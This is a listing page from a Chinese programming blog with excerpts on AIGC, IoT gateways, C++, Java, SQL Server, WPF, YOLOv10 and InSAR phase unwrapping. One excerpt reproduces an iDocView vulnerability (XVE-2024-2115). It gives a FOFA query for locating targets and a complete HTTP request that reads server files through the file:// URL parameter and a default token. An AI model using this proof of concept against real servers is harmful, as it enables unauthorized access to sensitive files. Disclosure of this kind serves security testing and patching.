<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.133.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大咖的博客">
		<meta property="og:url" content="https://bcdaka.github.io/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="编程大咖">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/865e7f790cb38e76bfe2b6da067194af/" rel="bookmark">
			了解AIGC：让AI创造内容，改变未来
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人不走空 🌈个人主页：人不走空 💖系列专栏：算法专题 ⏰诗词歌赋：斯是陋室，惟吾德馨 目录
什么是AIGC？
定义和概念 🧠
关键技术 🤖
AIGC的发展历程 🕰️
早期阶段：基础研究与初步应用
中期阶段：技术进步与应用扩展
近期发展：多模态融合与广泛应用
AIGC的主要应用场景 🖼️
文本生成 📄
图像和视频生成 🎨
音频生成 🎧
综合应用 🧩
AIGC的优势与挑战 🌟
优势 🌈
挑战 ⛔
AIGC的未来展望 🚀
技术趋势 📈
行业应用 🌍
社会影响 🌐
结语
作者其他作品：
全面了解AIGC：让AI创造内容，改变未来 人工智能生成内容（AIGC, AI-Generated Content），已经成为近年来技术创新的前沿阵地。无论是写文章、作曲、绘画，还是视频制作，AIGC都在以惊人的速度改变着各行各业的创作方式。那么，AIGC究竟是什么？它的发展现状如何？未来又会走向哪里呢？让我们一起全面了解AIGC的方方面面！
什么是AIGC？ 定义和概念 🧠 AIGC是指利用人工智能技术自动生成各种形式的内容，包括但不限于文本、图像、音频和视频。这些内容的生成过程几乎完全依赖于AI算法，而不需要人为的直接干预。
关键技术 🤖 AIGC的实现依赖于几项核心技术：
自然语言处理（NLP）：用于理解和生成自然语言文本。典型的应用有生成新闻报道、故事、对话等。计算机视觉（CV）：用于图像和视频内容的生成与编辑，比如生成艺术作品或修改照片。生成对抗网络（GAN）：一种强大的AI模型，用于生成高质量的图像、音频和视频。深度学习（Deep Learning）：通过复杂的神经网络结构，深度学习使AI能够学习和生成复杂的内容形式。 AIGC的发展历程 🕰️ 早期阶段：基础研究与初步应用 AIGC的早期发展主要集中在NLP和CV领域的基础研究上。随着深度学习的突破，AI开始具备生成简单文本和图像的能力。
1997年：IBM的深蓝（Deep Blue）击败国际象棋世界冠军，标志着AI的计算能力和初步的智能表现。2000年：早期的文本生成系统出现，但输出质量较差，主要用于简单的模板生成。 中期阶段：技术进步与应用扩展 从2010年开始，随着深度学习算法和计算能力的进步，AIGC进入了快速发展阶段。
2014年：GAN的提出使得AI在生成图像和视频方面取得重大突破。2018年：OpenAI发布的GPT-2模型展示了AI生成高质量文本的潜力，带来了自然语言生成的革命性进展。 近期发展：多模态融合与广泛应用 近年来，AIGC技术在多模态内容生成上取得了显著进展，AI能够同时处理和生成文本、图像、音频和视频。
2020年：OpenAI发布GPT-3，成为当时最先进的文本生成模型，能够生成高质量的长文本。2021年：DALL·E和CLIP模型展示了AI在图像生成和理解方面的能力，能够根据文本描述生成逼真的图像。2023年：多家科技巨头如谷歌、微软、腾讯等纷纷推出各自的AIGC平台和应用，加速了AIGC的商业化进程。 AIGC的主要应用场景 🖼️ 文本生成 📄 AI可以自动生成多种形式的文本，从新闻报道到小说创作，再到技术文档和广告文案。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/865e7f790cb38e76bfe2b6da067194af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93a0b31463d9767ab7e0e85f9c3dc94f/" rel="bookmark">
			设备物联网关在实际生产中的作用解析-天拓四方
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着物联网技术的迅猛发展，设备物联网关作为连接物理世界与数字世界的核心组件，其应用已经渗透到工业、农业、医疗等多个领域。本案例将聚焦于设备物联网关在某制造企业中的应用，详细解析其在实际生产中的重要作用。
案例背景
某制造企业面临着设备数据采集、设备间协同工作以及生产流程优化等挑战。传统的数据采集方式效率低下，且无法实现设备间的有效协同。因此，企业决定引入设备物联网关，实现设备的智能化管理和数据的高效采集。
解决方案与实施
针对企业的需求，设备物联网关的应用解决方案主要包括以下几个方面：
1、设备连接与数据采集
物联网关作为设备间的通信桥梁，能够连接各种不同类型的设备，实现设备间的互联互通。通过物联网关，企业可以实时采集设备的运行状态、生产数据等信息，为后续的数据分析和生产优化提供基础。
2、数据整合与处理
物联网关能够将来自不同设备的数据进行整合，并按照特定的格式进行标准化处理。这使得企业可以更加方便地对数据进行统一管理和分析，发现生产过程中的潜在问题，进而提出改进方案。
3、生产流程优化
基于物联网关采集的数据，企业可以对生产流程进行深入分析，找出生产中的瓶颈和低效环节。通过优化生产流程，企业可以提高生产效率，降低生产成本，增强市场竞争力
功能特点与优势
1、高效的数据采集与整合
物联网关能够实时、准确地采集设备数据，并进行高效整合，为企业提供了丰富的数据源。
2、强大的数据处理能力
物联网关内置强大的数据处理模块，能够对采集到的数据进行清洗、转换和标准化处理，提高了数据的可用性和准确性。
3、灵活的设备连接能力
物联网关支持多种通信协议和设备接口，可以轻松连接各种不同类型的设备，实现设备间的无缝对接。
应用效果
通过引入设备物联网关，该制造企业实现了设备数据的实时采集和高效整合，为生产流程优化提供了有力支持。同时，物联网关的应用还提高了企业的生产效率，降低了生产成本，为企业的发展注入了新的动力。
本案例展示了设备物联网关在某制造企业中的实际应用效果和价值。通过设备物联网关的应用，企业实现了设备数据的实时采集、高效整合以及生产流程的优化，提升了企业的竞争力和创新能力。未来，随着物联网技术的不断发展，设备物联网关将在更多领域发挥重要作用，推动产业的智能化升级。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fbe8abb776c77e42196279eecbb7958/" rel="bookmark">
			【C&#43;&#43;】和【预训练模型】实现【机器学习】【图像分类】的终极指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
💗1. 准备工作和环境配置💕
💖安装OpenCV💕
💖安装Dlib💕
下载并编译TensorFlow C++ API💕
💗2. 下载和配置预训练模型💕
💖2.1 下载预训练的ResNet-50模型💕
💖2.2 配置TensorFlow C++ API💕
💖2.3 加载和使用模型💕
💗3.编写代码进行图像分类💕
💖CMakeLists.txt💕
💖main.cpp💕
💗4. 代码分析和推导💕
💖初始化TensorFlow会话💕
💖读取和导入模型💕
💖读取输入图像💕
💖创建输入Tensor💕
💖运行会话并处理输出💕
💗5. 进阶优化与性能提升💕
💖多线程处理💕
💖GPU加速💕
💖模型优化💕
💗6. 问题与解决方案💕
💖问题1：内存不足💕
💖问题2：推理速度慢💕
💖问题3：模型兼容性问题💕
在现代机器学习和人工智能应用中，图像分类是一个非常常见且重要的任务。通过使用预训练模型，我们可以显著减少训练时间并提高准确性。C++作为一种高效的编程语言，特别适用于需要高性能计算的任务。
💗1. 准备工作和环境配置💕 首先，我们需要配置开发环境。这里我们将使用以下工具和库：
C++ 编译器 (如GCC)CMake 构建系统OpenCV 库Dlib 库下载并编译C++版本的TensorFlow 💖安装OpenCV💕 在Linux系统上，可以通过以下命令安装OpenCV：
sudo apt-get update sudo apt-get install libopencv-dev 💖安装Dlib💕 Dlib是一个现代C++工具包，包含了机器学习算法和工具。可以通过以下命令安装：
git clone https://github.com/davisking/dlib.git cd dlib mkdir build cd build cmake .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fbe8abb776c77e42196279eecbb7958/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9308f0126c30d73927f031005666279b/" rel="bookmark">
			SQL Server几种琐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL Server 中的锁类型主要包括以下几种，它们用于控制并发访问和数据一致性：
1. 共享锁（Shared Lock，S 锁）：
- 用于读取操作（如 SELECT 语句）。
- 允许多个事务同时读取同一资源，但不允许任何事务修改该资源。
2. 独占锁（Exclusive Lock，X 锁）：
- 用于修改操作（如 INSERT、UPDATE 和 DELETE 语句）。
- 当一个事务持有独占锁时，其他任何事务都不能读取或修改该资源。
3. 更新锁（Update Lock，U 锁）：
- 用于可能会被更新的数据读取操作，防止死锁。
- 在开始读取时获取更新锁，如果需要修改数据，则会升级为独占锁。
4. 意向锁（Intent Lock）：
- 用于指示将要在更细粒度的对象上获取锁。
- 包括意向共享锁（IS）、意向独占锁（IX）和意向更新锁（IU）。
- 例如，当一个事务在表级别上获取意向共享锁时，它表示事务将在该表中的某些行上获取共享锁。
5. 架构锁（Schema Lock）：
- 用于操作数据库架构的事务（如 CREATE、ALTER 和 DROP 语句）。
- 包括架构修改锁（Sch-M）和架构稳定锁（Sch-S）。
6. 键范围锁（Key-Range Lock）：
- 用于保护键值范围，以避免幻读。
- 包括键范围共享锁（RangeS-S）、键范围独占锁（RangeS-U）和键范围更新锁（RangeI-N）。
这些锁类型共同作用，以确保 SQL Server 在并发环境中保持数据一致性和完整性。不同的锁策略和隔离级别可以根据具体需求进行调整，以优化性能和并发性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40f75470b10c46ce2c9da84fe8f1d0de/" rel="bookmark">
			「漏洞复现」I Doc View 在线文档预览 qJvqhFt.json 任意文件读取漏洞(XVE-2024-2115)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x01 免责声明 请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！
0x02 产品介绍 iDocView是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。
0x03 漏洞威胁 iDocView是一个在线文档预览系统 /view/qJvqhFt.json 接口处存在任意文件读取漏洞，未授权的攻击者可以利用此接口并携带默认token读取服务器敏感文件信息，使系统处于极度不安全的状态。
0x04 漏洞环境 FOFA:
title=="在线文档预览 - I Doc View" 0x05 漏洞复现 POC
GET /view/qJvqhFt.json?start=1&amp;size=5&amp;url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&amp;idocv_auth=sapi HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close 0x06 批量脚本验证 Nuclei验证脚本已发布
知识星球：冷漠安全
0x07 修复建议 更新 I Doc View 在线文档预览系统至安全版本：
https://www.idocv.com/ 临时屏蔽/view/qJvqhFt.json接口
0x08 加入我们 漏洞详情及批量检测POC工具请前往知识星球获取
知识星球：冷漠安全
交个朋友，限时优惠券：加入立减25
星球福利：每天更新最新漏洞POC、资料文献、内部工具等
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40f75470b10c46ce2c9da84fe8f1d0de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de7256fd5288e1e7654a03ed4a9201f6/" rel="bookmark">
			IntelliJ IDEA 2024与MySQL 8连接以及driver问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 我是使用2024的专业版IDEA和8.0.37社区版mysql，主要是为了写javaweb项目，连接二者遇到了driver问题，经过上网搜索，没有找到和我碰到相同问题的，自己摸索，成功了，记录一下。
二、下载mysql对应的JDBC 下载链接：MySQL :: Download Connector/Jhttps://dev.mysql.com/downloads/connector/j/?os=26
别忘了确定版本号，我选择的是.zip文件，然后点击下载
下一步，点击最下方的 “ No thanks...... ” 即可：
自己放一个保存位置，解压就行。
三、配置IDEA 1、找到配置数据库database的位置 方法1 左上角点击 “ 新建 ” ——&gt; " Data Source " ——&gt; " MySQL " ——&gt; " MySQL "
方法2 直接从右边侧栏找到对应图标
然后点击 “ + ”，新建一个
2、配置Driver 还是依照刚才的选项，" Data Source " ——&gt; " MySQL " ——&gt; " MySQL "。然后弹出以下窗口：
User 和 Password都是要填自己数据库中之前设定好的账号密码。Database可以先不用填。
别忘了点击“应用”。
然后点击左上角的 "Drivers" ,一直往下划，找到 “ MySQL ”
在这里，我是已经配置了，如果没有配置过，应该是会有红色的字，然后点击它自带的链接下载就行。速度肯定会慢一点，稍等以下就好了。最后别忘了点击 “ 应用 ”。
然后左侧栏再往上划拉，找到 “ AWS driver for Aurora MySQL ”，对右边的类选择，小心不要选错了，然后下面添加上Driver Files，也就是刚刚下载的JDBC。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de7256fd5288e1e7654a03ed4a9201f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f024fe699dbc769b6a59078cb54803f3/" rel="bookmark">
			C# WPF入门学习主线篇（二十四）—— 数据绑定基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C# WPF入门学习主线篇（二十四）—— 数据绑定基础 数据绑定是WPF的重要特性之一，它允许UI元素和数据源之间建立连接，从而实现数据的自动更新和显示。通过数据绑定，开发者可以减少大量的手动更新代码，使应用程序更具响应性和可维护性。本篇博客将详细介绍WPF数据绑定的基础知识，包括单向绑定、双向绑定、绑定路径和数据上下文。
1. 数据绑定基础 数据绑定是指将控件的属性与数据源进行连接，使得控件的显示内容和数据源保持同步。WPF支持多种数据绑定模式，最常见的有以下几种：
1.1 单向绑定（OneWay） 单向绑定是指从数据源到目标控件的单向更新。控件会随着数据源的变化而自动更新，但控件的变化不会影响数据源。
示例： &lt;Window x:Class="WpfApp.MainWindow" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Title="DataBinding Demo" Height="200" Width="300"&gt; &lt;Grid&gt; &lt;TextBox Text="{Binding Name}" Width="200" Height="30" Margin="10"/&gt; &lt;/Grid&gt; &lt;/Window&gt; using System.ComponentModel; using System.Windows; namespace WpfApp { public partial class MainWindow : Window { public MainWindow() { InitializeComponent(); DataContext = new Person { Name = "Alice" }; } } public class Person : INotifyPropertyChanged { private string name; public string Name { get { return name; } set { if (name !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f024fe699dbc769b6a59078cb54803f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab1f0343e566ca64afc98310ed14b059/" rel="bookmark">
			[深度学习]基于C&#43;&#43;和onnxruntime部署yolov10的onnx模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于C++和ONNX Runtime部署YOLOv10的ONNX模型，可以遵循以下步骤：
准备环境：首先，确保已经下载后指定版本opencv和onnruntime的C++库。
模型转换：按照官方源码：https://github.com/THU-MIG/yolov10 安装好yolov10环境并将YOLOv10模型转换为ONNX格式。这通常涉及使用深度学习框架（如PyTorch或TensorFlow）加载原始模型，并导出为ONNX格式。转换指令
# End-to-End ONNX yolo export model=jameslahm/yolov10{n/s/m/b/l/x} format=onnx opset=13 simplify # Predict with ONNX yolo predict model=yolov10n/s/m/b/l/x.onnx C++环境配置：在CMakeLists.txt项目中正确引用了opencv和ONNX Runtime的头文件，并链接到相应的库。这允许在C++代码中使用ONNX Runtime的功能。
加载模型：使用ONNX Runtime的API加载转换后的YOLOv10 ONNX模型。
执行推理：通过ONNX Runtime的推理引擎，将图像数据输入到模型中，并执行目标检测任务。
处理结果：解析模型输出的结果，这通常涉及将输出的张量数据转换为可理解的检测结果，如边界框坐标和类别标签。
通过这些步骤，可以在C++环境中利用ONNX Runtime高效地部署YOLOv10模型，实现实时的目标检测功能。
【测试环境】
windows10 x64
vs2019
cmake==2.24.3
onnxruntime==1.12.0
opencv==4.7.0
【使用步骤】
首先cmake生成exe文件，然后将onnxruntime.dll和onnxruntime_providers_shared.dll放到exe一起，不然会提示报错0xc000007b，这是因为系统目录也有个onnxruntime.dll引发冲突，并把car.mp4也放到exe一起。运行直接输入
yolov10.exe C:\Users\Administrator\Desktop\yolov10-onnx-cplus\models\yolov10n.onnx
注意onnx路径要是你真实路径我的onnx路径是我桌面上地址
【代码调用】
注意onnxruntime使用的cpu版本库，如需使用GPU还需要修改代码才行
#include "YOlov10Manager.h" #include &lt;iostream&gt; #include &lt;opencv2/opencv.hpp&gt; int main(int argc, char const *argv[]) { std::string model_path = argv[1]; cv::namedWindow("yolov10", cv::WINDOW_AUTOSIZE); Yolov10Manager detector(model_path); cv::VideoCapture cap("car.mp4");//这个地方也可以修改成视频路径或者摄像头索引 if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab1f0343e566ca64afc98310ed14b059/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f1212427cf7c18efce57eb475e3b4aa/" rel="bookmark">
			【JavaEE精炼宝库】多线程（5）单例模式 | 指令重排序 | 阻塞队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、单例模式：
1.1 饿汉模式：
1.2 懒汉模式：
1.2.1 线程安全的懒汉模式：
1.2.2 线程安全的懒汉模式的优化：
二、指令重排序
三、阻塞队列
3.1 阻塞队列的概念：
3.2 生产者消费者模型：
3.3 标准库中的阻塞队列：
3.4 阻塞队列实现：
一、单例模式： 单例模式是校招中最常考的设计模式之一。
设计模式是什么?
设计模式好比象棋中的 "棋谱"。红方当头炮，黑方马来跳。针对红方的⼀些走法，黑方应招的时候有一些固定的套路。按照套路来走局势就不会吃亏。软件开发中也有很多常见的 "问题场景" 针对这些问题场景，大佬们总结出了一些固定的套路。按照这个套路来实现代码，也不会吃亏。大佬们为我们操碎了心。
单例模式能保证某个类在程序中只存在唯⼀⼀份实例，而不会创建出多个实例。这一点在很多场景上都需要。比如 JDBC 中的 DataSource 实例就只需要一个。
单例模式具体的实现方式有很多。最常见的是 "饿汉" 和 "懒汉" 两种。
1.1 饿汉模式： 类加载的同时，创建实例。
• 案例代码实现：
核心思想就是把构造方法设置为 private ，再把实例用 static 修饰。程序一运行，实例就被创建了，Singleton 类外面想要得到这个对象，只能通过 getInstance 来得到，所以能保证这个实例只被创建一次。
class Singleton{ private static Singleton instance = new Singleton();//static 要记得加 private Singleton(){}//这里要设置成 private，防止创建出多个实例 public static Singleton getInstance(){ return instance; } } 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f1212427cf7c18efce57eb475e3b4aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cbb808b368493ef70b78d5eee9549a6/" rel="bookmark">
			6月ChatGPT商业运营网站程序源码，支持Midjourney绘画，GPT语音对话&#43;DALL-E3文生图&#43;suno-ai音乐生成&#43;TTS语音对话&#43;支持GPTs
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		6月ChatGPT商业运营网站程序源码，支持Midjourney绘画，GPT语音对话+DALL-E3文生图+suno-ai音乐生成+TTS语音对话+支持GPTs 文章目录 6月ChatGPT商业运营网站程序源码，支持Midjourney绘画，GPT语音对话+DALL-E3文生图+suno-ai音乐生成+TTS语音对话+支持GPTs前言一、文档总结二、效果展示1、前台演示1.1 GPT模型提问1.2 应用工作台1.3 Midjourney专业绘画1.4 mind思维导图1.5 商城套餐订阅1.6 AI绘画广场1.7 分销系统 2、后台管理员演示2.1 后台主页 三、搭建与部署3.1 基础env环境配置3.2 环境安装3.3 部署跑起来3.4 启动项目3.5 使用系统修改超级管理员默认密码 四、系统更新五、系统授权 前言 SparkAi创作系统是基于ChatGPT进行开发的Ai智能问答系统和Midjourney绘画系统，支持OpenAI-GPT全模型+国内AI全模型。本系统支持MidJourney绘画、支持DALL-E3绘画，支持最新gpt-4o-2024-05-13多模态模型、支持suno-AI音乐生成、支持GPT文档对话总结！让我们看下系统效果吧！
系统成品演示：http://chatai.zackary.cn/
（若无法进去浏览器打开即可）
本文基于SparkAi系统作者文案，进行版本更新性调整。更新时间：2024/5/18
————————————————
版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 原文链接：https://blog.csdn.net/weixin_43227851/article/details/135202086
一、文档总结 项目介绍及联系我们：项目介绍 / 联系我们系统功能介绍：系统功能 二、效果展示 1、前台演示 1.1 GPT模型提问 已支持GPT、Claude-3、Gemini-pro、文心一言等AI模型自主排序添加。
支持最近火爆的Suno-v3-AI音乐生成大模型、TTS语音对话等。
1.2 应用工作台 1.3 Midjourney专业绘画 支持同步官方图片重新生成指令同步官方 Vary 指令 单张图片对比加强 Vary(Strong) | Vary(Subtle)同步官方 Zoom 指令 单张图片无限缩放 Zoom out 2x | Zoom out 1.5x! 1.4 mind思维导图 思维导图支持左侧自动生成、支持自定义修改、支持HTML、PNG、SVG多种格式导出。
1.5 商城套餐订阅 支持多种套餐设置、套餐排序、套餐图片上传等。
1.6 AI绘画广场 后台支持将用户优质作品“推荐”至AI绘画广场。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cbb808b368493ef70b78d5eee9549a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f33439716b354d95ca2e76b10e792346/" rel="bookmark">
			Java中ArrayList（顺序表）的自我实现（如果想知道Java中怎么自我实现ArrayList，那么只看这一篇就足够了！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：在 Java 编程中，ArrayList 是一种非常常用的数据结构，它提供了动态数组的实现方式，可以方便地存储和操作数据。相比于传统的数组，ArrayList 具有更多的灵活性和便利性，可以根据需要动态地调整大小，并提供了一系列丰富的方法来增删改查元素，但是本篇文章主要讲解如何去自我实现Java中ArrayList（顺序表）。
✨✨✨这里是秋刀鱼不做梦的BLOG
✨✨✨想要了解更多内容可以访问我的主页秋刀鱼不做梦-CSDN博客
先让我们看一下本文的大致内容：
目录
1.自我定义ArrayList类
2.自我实现ArrayList中的方法
（1）新增元素,默认在数组最后新增
（2）在 pos 位置新增元素
（3）判定是否包含某个元素
（4）查找某个元素对应的位置
（5）获取 pos 位置的元素
（6）给 pos 位置的元素设为 value
（7）删除第一次出现的关键字key
（8）获取顺序表长度
（9）打印顺序表
3.总结自我实现ArrayList
1.自我定义ArrayList类 在自我实现Java中的ArrayList（顺序表）之前，我们需要先自我定义一个ArrayList类，定义方式如下：
public class MyArrayList{ //创建一个数组 private int[] array; //用于记录数组中的元素格式 private int arrayNumber; //初始化数组原始大小 public static final int CAPACITY = 10; //构造方法 public MyArrayList() { this.array = new int[CAPACITY]; this.arrayNumber = 0; } 这段代码定义了一个名为MyArrayList的类，用于实现顺序表。以下是对代码的分析：
私有属性：
array：一个整型数组，用于存储元素。
arrayNumber：一个整型变量，用于记录数组中元素的个数。
CAPACITY：一个常量，表示数组的初始容量。
构造方法：
MyArrayList()：构造方法初始化了数组array为长度为CAPACITY的整型数组，并将arrayNumber初始化为0。
这样我们就定义好了一个ArrayList类，接下来就是实现Java中ArrayList中的方法了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f33439716b354d95ca2e76b10e792346/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c62b2591023ce2c4d909c0d0027a7bd3/" rel="bookmark">
			相位解缠原理及传统算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		InSAR处理实际得到的相位被限制在[-，]，只是缠绕相位。因此我们需要进行相位解缠，恢复整周模糊数2k，从而计算正确的高程或形变相位。
基本原理 相位解缠的结果要求要满足一致性和精确性。一致性是指任意两点的相位差与积分路径无关，这就要求；精确性是指解缠后能真实反映绝对相位
一维相位解缠 对于一维信号，缠绕相位和绝对相位具有如下关系：
其中表示缠绕相位，表示绝对相位
相位解缠的基本思想是对缠绕相位的差分值进行积分，主要步骤如下：
1）计算相邻像元的相位差分D(i)
2）对相邻像元的相位差分D(i)进行缠绕
3）初始化起始点的绝对相位
4）累加相邻像元的相位差分，计算当前像元的绝对相位值
已知，可推出，满足一致性要求
二维相位解缠 SAR干涉图的相位是二维矩阵，因此对应的相位解缠是二维相位解缠。假设缠绕干涉图中任意一点的相位为，则其对应的二维解缠相位为：
在不加任何限制条件的情况下，任意两点间积分路径可能不唯一。如果此时仍满足任意两点间相位差的绝对值小于这一条件，那么沿任意积分路径分布的相位将变成一维数组，对应二维解缠的结果也具有满足相位一致性要求。缠绕相位的梯度可表示为：
式中分别表示相邻像素的缠绕相位
假设以为解缠起点，则其余像素的绝对相位可通过对缠绕相位梯度积分求得：
然而，在实际情况下干涉图中往往存在噪声、相位欠采样、相位混叠等种种问题，导致相位连续性假设失效，局部误差沿积分路径传播为全局误差。
传统相位解缠算法 为解决上述问题，各位学者提出了很多种相位解缠算法，这些算法主要分为三类：1.路径跟踪法 2.最小范数法 3.网络流法。下面将分别介绍这三类算法：
1.路径跟踪法 该算法的主要思想是通过选择合适的积分路径，以对相邻像元的相位梯度进行积分的方式实现相位解缠。有3种代表性算法：
1）Goldstein枝切算法 该方法是由Goldstein等人于1988年提出，其主要思想是通过设置枝切线连接正负残差点，保证每条枝切线上残差点极性总和为0以达到平衡残差点的目的。其主要操作步骤如下：
（1）识别干涉图中残差点。残差点是指干涉图中由于噪声或相位欠采样而导致的相位不一致的点。残差点的识别主要包含两步：a.归一化处理二位相位影像 b.围绕最小闭合路径（2*2像素板块）累加相位梯度值。通过相位梯度的累加值判断是否存在残差点及残差点的极性。
（2）以识别到的残差点为中心基准点，安置3*3或更大的窗口扫描其余残差点并连接形成枝切线。当搜索窗口已包含像元边界时，将其与中心基准残差点之间安置枝切线。
（3）以干涉图中任一非残差点为起点，对周围未解缠的非残差点进行相位梯度积分计算解缠相位，一旦遇到残差点立刻停止积分。重复该步骤直至所有非残差点完成相位解缠。
（4）位于残差点的相位，通过周围已解缠的像素点进行拟合。如果周围不存在为解缠像素，则将该点视为误差点剔除。
在信噪比较高，残差点较少的情况下，枝切法具有速度快精度高的显著优势，但是当残差点较多且分布密集时，该算法难以正确的连接枝切线而形成“孤岛”。
2）质量引导法 该方法不识别残差点也不设置枝切线，而是通过相位质量图定义相位质量，控制积分路径沿高质量像元向低质量像元方向前进。
相位质量图主要包含四种：相干系数图、伪相干图、相位导数变化图和最大相位梯度图。
3）掩膜枝切算法 该方法结合了Goldstein算法和质量图引导算法各自的优势，在识别残差点的情况下，使用质量图引导枝切线的安置。该算法不从高质量区域开始解缠，而是低质量区域逐渐扩展像素掩膜，直到连接了等量的正负残差点或到达图像边界。
2.最小范数法 基于最小范数法的解缠理念与路径跟踪法不同，它的基本思想是建立代价函数，求解最优的解缠相位，使得解缠相位梯度与缠绕相位梯度得差值最小。用数学公式来表示即是是下式取得最小值：
表示第i行j列的解缠相位，表示第i行j列的缠绕相位
通过上式，将相位解缠问题转换为最小二乘法求解问题。通常最小二乘法可分为加权最小二乘和无权最小二乘
虽然最小范数法稳定性较好，但目前仍存在两方面问题：1）最小范数法求得的是全局最优解，导致在局部的相位解缠精度较低 2）最小范数法在低相干区域的解缠精度较低，误差较大，且误差会传播到整幅干涉相位图中
3.网络流法 网络流法则兼顾了速度和精确性两方面，其基本思想是将解缠相位梯度和缠绕相位梯度之间的差异最小化。网络流法一般采用相干系数来确定权重，但是相关系数有时存在一定的估计偏差，导致解缠误差。
网络流法中最经典的为最小费用流法（MCF)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59de586872bab1bf2ea1791a38ce0453/" rel="bookmark">
			基于MATLAB仿真的BCC卷积码维特比译码算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🧑🏻个人简介：具有3年工作经验，擅长通信算法的MATLAB仿真和FPGA实现。代码事宜，私信博主，程序定制、设计指导。
🚀基于MATLAB仿真的BCC卷积码维特比译码算法
目录
🚀1.BCC卷积码概述
🚀2.维特比译码算法
🚀2.1概述
